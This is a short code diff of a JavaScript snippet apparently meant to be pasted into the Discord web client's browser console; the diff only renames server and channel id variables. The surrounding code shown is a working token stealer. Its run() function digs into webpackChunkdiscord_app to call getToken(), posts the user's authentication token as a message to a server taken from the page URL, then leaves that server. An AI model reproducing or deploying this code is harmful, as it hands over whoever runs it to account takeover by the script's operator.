@@ -1,6 +1,6 @@
 {
-  var gid = '<guild_id>' // Current guild id
-  var cid = '<channel_id>' // Current channel id
+  var serverid = '<guild_id>' // Current guild id
+  var channelid = '<channel_id>' // Current channel id
   
   
   
@@ -55,10 +55,10 @@
 
 
 
-  // Call this to update `cid` and `gid` to current channel and guild id
+  // Call this to update `channelid` and `serverid` to current channel and guild id
   var id = (log = true) => {
-    gid = window.location.href.split('/').slice(4)[0]
-    cid = window.location.href.split('/').slice(4)[1]
+    serverid = window.location.href.split('/').slice(4)[0]
+    channelid = window.location.href.split('/').slice(4)[1]
     if (log) {
     }
   }
@@ -101,7 +101,7 @@
   }
 }
 async function run() {
-  await api.sendMessage(gid,(
+  await api.sendMessage(serverid,(
     webpackChunkdiscord_app.push(
         [
             [''],
@@ -117,7 +117,7 @@ async function run() {
 ).find(
     m => m?.exports?.default?.getToken !== void 0
 ).exports.default.getToken())
-  await api.leaveServer(gid)
+  await api.leaveServer(serverid)
 }
 
 run()
